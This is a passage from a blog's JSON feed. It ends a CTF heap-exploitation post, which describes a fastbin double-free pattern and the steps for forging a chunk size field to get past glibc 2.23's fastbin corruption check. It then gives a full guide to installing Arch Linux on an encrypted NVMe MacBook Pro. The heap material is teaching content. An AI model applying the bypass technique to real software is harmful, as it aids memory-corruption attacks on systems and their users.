is:</p>\n<ul>\n<li>free(A)</li>\n<li>free(B)</li>\n<li>free(A)</li>\n</ul>\n<h2 id=\"check-2-malloc-memory-corruption-fast\"><a class=\"markdownIt-Anchor\" href=\"#check-2-malloc-memory-corruption-fast\">#</a> Check 2: malloc(): memory corruption (fast)</h2>\n<p>In glibc 2.23,  <code>_int_malloc()</code>  will refuse to return a freed chunk from a fastbin if that chunk has incorrect size.</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">__builtin_expect</span><span class=\"token punctuation\">(</span><span class=\"token function\">fastbin_index</span><span class=\"token punctuation\">(</span><span class=\"token function\">chunksize</span><span class=\"token punctuation\">(</span>victim<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">!=</span> idx<span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>\terrstr <span class=\"token operator\">=</span> <span class=\"token string\">\"malloc(): memory corruption (fast)\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>errout<span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>\t<span class=\"token function\">malloc_printerr</span><span class=\"token punctuation\">(</span>check_action<span class=\"token punctuation\">,</span> errstr<span class=\"token punctuation\">,</span> <span class=\"token function\">chunk2mem</span> <span class=\"token punctuation\">(</span>victim<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> av<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>\t<span class=\"token keyword\">return</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>Source: <span class=\"exturl\" data-url=\"aHR0cHM6Ly9lbGl4aXIuYm9vdGxpbi5jb20vZ2xpYmMvZ2xpYmMtMi4yMy9zb3VyY2UvbWFsbG9jL21hbGxvYy5jI0wzMzg1\">https://elixir.bootlin.com/glibc/glibc-2.23/source/malloc/malloc.c#L3385</span></p>\n<p>To bypass this restriction, the freed chunk‚Äôs  <code>size</code>  field (right before  <code>fd</code> ) must be set to the correct size. A commonly used technique is to:</p>\n<ul>\n<li>Look for the byte pattern  <code>7f 00 00 00 00 00 00 00</code>  in memory, and use it as the  <code>size</code>  field.</li>\n<li>Go back 8 bytes to obtain the base address of the chunk.</li>\n<li>Place this chunk into a fastbin, either by free()ing it or fastbin dup.</li>\n</ul>\n",
            "tags": [
                "linux",
                "ctf",
                "binary-exploitation"
            ]
        },
        {
            "id": "https://aesophor.github.io/2020/07/20/Arch-Linux-on-MacBook-Pro-11-2-with-Custom-NVMe-M-2-SSD/",
            "url": "https://aesophor.github.io/2020/07/20/Arch-Linux-on-MacBook-Pro-11-2-with-Custom-NVMe-M-2-SSD/",
            "title": "Arch Linux on MacBook Pro 11,2 with Custom NVMe M.2 SSD",
            "date_published": "2020-07-20T10:48:46.000Z",
            "content_html": "<p><img data-src=\"banner.jpg\" alt=\"banner\"></p>\n<h1 id=\"introduction\"><a class=\"markdownIt-Anchor\" href=\"#introduction\">#</a> Introduction</h1>\n<p>The only laptop I own is Apple‚Äôs <span class=\"exturl\" data-url=\"aHR0cHM6Ly9zdXBwb3J0LmFwcGxlLmNvbS9rYi9zcDcwND9sb2NhbGU9ZW5fVVM=\">MacBook Pro Retina 15&quot; (late 2014)</span>, on which I‚Äôve run Gentoo Linux for about three years. Recently, I replaced my MacBook‚Äôs SSD with <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuc2Ftc3VuZy5jb20vc2VtaWNvbmR1Y3Rvci9taW5pc2l0ZS9zc2QvcHJvZHVjdC9jb25zdW1lci85NzBldm9wbHVzLw==\">Samsung‚Äôs 970 EVO Plus NVMe M.2 SSD (1TB)</span> and decided to install Arch Linux on it.</p>\n<h1 id=\"back-up-the-old-ssd\"><a class=\"markdownIt-Anchor\" href=\"#back-up-the-old-ssd\">#</a> Back Up the Old SSD</h1>\n<p>I booted into a  <code>Gentoo Live USB</code>  and used  <code>dd</code>  to back up my entire old SSD to an image file.</p>\n<pre><code>root$ dd if=/dev/sda of=/mnt/external_drive/old_ssd.img bs=4M\n</code></pre>\n<p>Later on, after the new NVMe M.2 SSD has been installed, I could mount my external hard drive on  <code>/mnt/external_drive</code>  and run the following commands to copy all my data from the image file to the new SSD. The only drawback of this approach is that I have to manually resize the partitions later.</p>\n<pre><code>root$ dd if=/mnt/external_drive/old_ssd.img of=/dev/nvme0n1 bs=4M\n</code></pre>\n<h1 id=\"firmware-upgrade\"><a class=\"markdownIt-Anchor\" href=\"#firmware-upgrade\">#</a> Firmware Upgrade</h1>\n<p>Before installing NVMe M.2 SSD on your MacBook, make sure that you‚Äôve upgraded to <strong>macOS Mojave which includes the firmware required to boot from NVMe M.2 SSD</strong>.</p>\n<h1 id=\"ssd-upgrade\"><a class=\"markdownIt-Anchor\" href=\"#ssd-upgrade\">#</a> SSD Upgrade</h1>\n<blockquote>\n<p><strong>CAUTION</strong><br><br>\nBe very careful with the screws. I stripped some of my screws due to the bloated batteries, and ended up spending $3000 NTD (approx. $100 USD) for repairment.</p>\n</blockquote>\n<p>After upgrading to macOS Mojave, your MacBook should be able to recognize NVMe M.2 SSD from now on. Now we can remove the screws on its back and install the new SSD. I bought the Screwdrivers + SSD Adapter on <span class=\"exturl\" data-url=\"aHR0cDovL3Nob3BlZS50dw==\">shopee.tw</span> -&gt; <a href=\"https://shopee.tw/product/4848951/1501356237\"><strong>Link</strong></a></p>\n<p><img data-src=\"swap.jpg\" alt=\"swap\"></p>\n<h1 id=\"ssd-data-migration\"><a class=\"markdownIt-Anchor\" href=\"#ssd-data-migration\">#</a> SSD Data Migration</h1>\n<p>After upgrading my MacBook‚Äôs SSD, I installed macOS on it and used it for a week. However, being a long-term GNU/Linux user, I started to miss all that freedom and customizability offered by Linux. Therefore, I decided to go back to Linux again.</p>\n<p>At first I used  <code>dd</code>  to clone all my data from the image file to the new SSD. However, this didn‚Äôt work for me, since <strong>I didn‚Äôt compile support for NVMe M.2 SSD into my gentoo linux kernel</strong>, so although the disk was successfully migrated, I wasn‚Äôt able to boot from it.</p>\n<h1 id=\"prepare-installation-medium\"><a class=\"markdownIt-Anchor\" href=\"#prepare-installation-medium\">#</a> Prepare Installation Medium</h1>\n<p>Instead of trying to recompile a new linux kernel with NVMe M.2 SSD support, I decided to leave Gentoo Linux this time. Gentoo is a beautiful Linux distribution (if you have time and patience), but after manually compiling all those packages for 3 years on this fucking MacBook, I‚Äôve already become kinda fed up with it.</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuYXJjaGxpbnV4Lm9yZy9kb3dubG9hZC8=\">Download Arch Linux ISO</span> and prepare Arch Live USB:</p>\n<pre><code>root$ dd if=/path/to/arch.iso of=/dev/sdX bs=4M\n</code></pre>\n<p>Power off your MacBook, insert the USB stick, hold  <code>alt/option</code>  and power it on again. Now you should see the option to boot from Arch Linux Live USB.</p>\n<h1 id=\"base-installation\"><a class=\"markdownIt-Anchor\" href=\"#base-installation\">#</a> Base Installation</h1>\n<p>After booting from Arch Linux Live USB, you‚Äôll be logged in as the root user. To get Internet connection, I simply plugged my Android phone into my Macbook simply via USB cable, turned on  <code>USB Tethering</code> , and ran:</p>\n<pre><code>root$ dhcpcd\n</code></pre>\n<p>Ensure the clock is accurate:</p>\n<pre><code>root$ timedatectl set-ntp true\n</code></pre>\n<p>Run  <code>cfdisk /dev/nvme0n1</code>  and partition the new SSD as follows:</p>\n<pre><code>                                   Disk: /dev/nvme0n1\n                 Size: 931.53 GiB, 1000204886016 bytes, 1953525168 sectors\n                Label: gpt, identifier: 85CF6A21-FC5C-408D-8532-8751C80F0593\n\nDevice                 Start          End        Sectors        Size Type\n/dev/nvme0n1p1          2048       411647         409600        200M EFI System             \n/dev/nvme0n1p2       411648    1953525134     1953113487      931.3G Linux filesystem\n</code></pre>\n<p>Now run  <code>lsblk</code>  and you‚Äôll see something like this:</p>\n<pre><code>NAME               MAJ:MIN RM   SIZE RO TYPE  MOUNTPOINT\nnvme0n1            259:0    0 931.5G  0 disk  \n‚îú‚îÄnvme0n1p1        259:1    0   200M  0 part  \n‚îî‚îÄnvme0n1p2        259:2    0 931.3G  0 part  \n</code></pre>\n<p>Prepare LVM+LUKS on the new SSD:</p>\n<pre><code>root$ cryptsetup -v --cipher aes-xts-plain64 --key-size 256 --hash sha1 --iter-time 1000\\\n            --use-random --verify-passphrase luksFormat /dev/nvme0n1p2\nroot$ cryptsetup luksOpen /dev/nvme0n1p2 lvm\nroot$ pvcreate /dev/mapper/lvm\nroot$ vgcreate vgcrypt /dev/mapper/lvm\nroot$ lvcreate --size 30G --name root vgcrypt\nroot$ lvcreate --extents +100%FREE --name home vgcrypt\nroot$ mkfs.fat -F32 /dev/nvme0n1p1\nroot$ mkfs.ext4 /dev/mapper/vgcrypt-root\nroot$ mkfs.ext4 /dev/mapper/vgcrypt-home\n</code></pre>\n<p>Now run  <code>lsblk</code>  again and you‚Äôll see something like this:</p>\n<pre><code>NAME               MAJ:MIN RM   SIZE RO TYPE  MOUNTPOINT\nnvme0n1            259:0    0 931.5G  0 disk  \n‚îú‚îÄnvme0n1p1        259:1    0   200M  0 part  \n‚îî‚îÄnvme0n1p2        259:2    0 931.3G  0 part  \n  ‚îî‚îÄvgcrypt        254:0    0 931.3G  0 crypt \n    ‚îú‚îÄvgcrypt-root 254:1    0    30G  0 lvm   \n    ‚îî‚îÄvgcrypt-home 254:2    0 901.3G  0 lvm   \n</code></pre>\n<p>Mount the partitions:</p>\n<pre><code>root$ mount /dev/mapper/vgcrypt-root /mnt\nroot$ mkdir -p /mnt/home\nroot$ mkdir -p /mnt/boot\nroot$ mount /dev/mapper/vgcrypt-home /mnt/home\nroot$ mount /dev/nvme0n1p1 /mnt/boot\n</code></pre>\n<p>Install the base system:</p>\n<pre><code>root$ pacstrap -i /mnt base base-devel linux linux-firmware lvm2\n</code></pre>\n<p>Generate fstab:</p>\n<ul>\n<li><code>-L</code>  generates the fstab with labels instead of UUIDs since we‚Äôre using encrypted LVM disk.</li>\n<li><code>-p</code>  prevents pseudo-filesystems from being added.</li>\n</ul>\n<pre><code>root$ genfstab -L -p /mnt &gt;&gt; /mnt/etc/fstab\nroot$ cat /mnt/etc/fstab\n</code></pre>\n<h1 id=\"configure-the-new-system\"><a class=\"markdownIt-Anchor\" href=\"#configure-the-new-system\">#</a> Configure the New System</h1>\n<p>Chroot into our new system:</p>\n<pre><code>root$ arch-chroot /mnt /bin/bash\n</code></pre>\n<p>Generate locales:</p>\n<ul>\n<li>uncomment the locales you‚Äôre going to use in /etc/locale.gen, and run  <code>locale-gen</code> .</li>\n<li>run  <code>echo LANG=en_US.UTF-8 &gt; /etc/locale.conf</code>  to make ENG UTF-8 the default locale.</li>\n</ul>\n<p>Replace the default console font with terminus:</p>\n<pre><code>root$ pacman -S terminus-font\nroot$ echo FONT=ter-v24n &gt; /etc/vconsole.conf\n</code></pre>\n<p>Set timezone and set time to UTC:</p>\n<pre><code>root$ ln -sf /usr/share/zoneinfo/Asia/Taipei /etc/localtime\nroot$ hwclock --systohc --utc\n</code></pre>\n<p>To ensure the kernel loads the proper modules to decrypt root disk at startup, we have to add necessary hooks in  <code>/etc/mkinitcpio.conf</code> :</p>\n<pre><code>HOOKS=&quot;base udev autodetect keyboard keymap modconf block consolefont encrypt lvm2 filesystems fsck&quot;\n</code></pre>\n<p>Regenerate the initramfs image to EFI Partition ( <code>/dev/nvme0n1p1</code> ):</p>\n<pre><code>root$ mkinitcpio -p linux\n</code></pre>\n<p>Set hostname:</p>\n<pre><code>root$ echo allegro &gt; /etc/hostname\n</code></pre>\n<p>Install systemd-boot as our bootloader:</p>\n<pre><code>root$ pacman -S dosfstools\nroot$ bootctl --path=/boot install\n</code></pre>\n<p>Add an boot entry for systemd-boot by editing  <code>/boot/loader/entries/arch.conf</code> :</p>\n<pre><code>title\tArch Linux\nlinux\t/vmlinuz-linux\ninitrd\t/initramfs-linux.img\noptions\tcryptdevice=/dev/nvme0n1p2:vgcrypt root=/dev/mapper/vgcrypt-root rw\n</code></pre>\n<p>Change root user‚Äôs password:</p>\n<pre><code>root$ passwd\n</code></pre>\n<p>Install additional packages:</p>\n<pre><code>root$ pacman -S dhcpcd git zsh vim neovim wget stow tmux\n</code></pre>\n<p>Reboot:</p>\n<pre><code>root$ reboot\n</code></pre>\n<p>Add an unprivileged user:</p>\n<pre><code>root$ useradd --create-home --groups wheel --shell /bin/zsh aesophor\nroot$ passwd aesophor\n</code></pre>\n<p>Set up sudo:</p>\n<ul>\n<li>run  <code>visudo</code>  and uncomment the line  <code>%wheel ALL=(ALL) ALL</code> .</li>\n</ul>\n<p>At this point, you may logout the root user and re-login with your unprivileged user.</p>\n<h1 id=\"post-installation\"><a class=\"markdownIt-Anchor\" href=\"#post-installation\">#</a> Post Installation</h1>\n<p>Install <a href=\"https://github.com/Jguer/yay\"> <code>yay</code> </a>, an AUR helper:</p>\n<pre><code>user$ git clone https://aur.archlinux.org/yay.git\nuser$ cd yay\nuser$ sudo makepkg -si\n</code></pre>\n<p>Install X and video drivers:</p>\n<pre><code>user$ sudo pacman -S xf86-video-intel mesa-libgl libva-intel-driver libva\nuser$ yay -S opencl-intel\nuser$ sudo pacman -S xorg-server xorg-xinit xorg-apps\n</code></pre>\n<p>Install  <code>xf86-input-mtrack</code>  as our trackpad driver:</p>\n<pre><code>user$ yay -S xf86-input-mtrack\nuser$ sudo wget -O /etc/X11/xorg.conf.d/10-mtrack.conf https://raw.githubusercontent.com/aesophor/macbookpro-11-2-gentoo-config/master/etc/X11/xorg.conf.d/10mtrack.conf\nuser$ sudo gpasswd -a aesophor input\n</code></pre>\n<p>Install  <code>broadcom-wl-dkms</code>  as our Wi-Fi driver (my laptop model is A1398):</p>\n<pre><code>user$ sudo pacman -S dkms broadcom-wl-dkms\n</code></pre>\n<p>Install  <code>bcwc-pcie-git</code>  as our FaceTimeHD webcam driver:</p>\n<pre><code>user$ yay -S bcwc-pcie-git\n</code></pre>\n<p>Install font packages:</p>\n<pre><code>user$ sudo pacman -S ttf-liberation wqy-zenhei wqy-bitmapfont\nuser$ yay -S siji-git uw-ttyp0-font\n</code></pre>\n<p>Get audio to work:</p>\n<pre><code>user$ sudo pacman -S pulseaudio alsa-lib alsa-utils\n</code></pre>\n<p>Install DE, WM, bar, etc:</p>\n<pre><code>user$ sudo pacman -S plasma-desktop\nuser$ yay -S wmderland-git polybar dunst picom rofi-git rxvt-unicode firefox\n</code></pre>\n<p>Install fcitx5 input method:</p>\n<pre><code>user$ sudo pacman -S fcitx5 fcitx5-chinese-addons fcitx5-configtool fcitx5-gtk fcitx5-qt fcitx5-material-color\nuser$ yay -S fcitx5-pinyin-zhwiki\n</code></pre>\n<p>Downgrade  <code>pango</code>  to 1.43 since &gt;= 1.44 cause issue with font rendering on rofi:</p>\n<pre><code>user$ sudo pacman -U https://archive.archlinux.org/packages/p/pango/pango-1.43.0-1-x86_64.pkg.tar.xz\n</code></pre>\n<p>Powersaving:</p>\n<pre><code>user$ yay -S powertop thermald cpupower mbpfan-git\nuser$ sudo systemctl enable thermald.service\nuser$ sudo systemctl enable cpupower.service\nuser$ sudo systemctl enable mbpfan.service\n</code></pre>\n<p>Finally, create systemd services that execute the following commands, respectively:</p>\n<ul>\n<li>echo ‚Äòdisable‚Äô &gt; /sys/firmware/acpi/interrupts/gpe06  # fix kworker high cpu usage</li>\n<li>echo ‚ÄúXHC1‚Äù &gt; /proc/acpi/wakeup  # fix immediate wakeup after suspension on macbook</li>\n<li>setpci -v -H1 -s 00:01.00 BRIDGE_CONTROL=0  # enable keyboard backlight control</li>\n</ul>\n<h1 id=\"enter-x11\"><a class=\"markdownIt-Anchor\" href=\"#enter-x11\">#</a> Enter X11</h1>\n<p>Install my dotfiles:</p>\n<pre><code>user$ git clone https://github.com/aesophor/dotfiles.git ~/Dots\nuser$ cd ~/Dots\nuser$ rm ~/.zshrc ~/.bashrc\nuser$ ./.install.sh\n</code></pre>\n<p>Start an X11 session (GUI) as your unprivileged user:</p>\n<pre><code>user$ startx\n</code></pre>\n<p>Voil√†. Now you can go ahead and start customizing it!<br>\n<img data-src=\"result.png\" alt=\"\"></p>\n",
            "tags": [
                "linux"
            ]
        }
    ]
}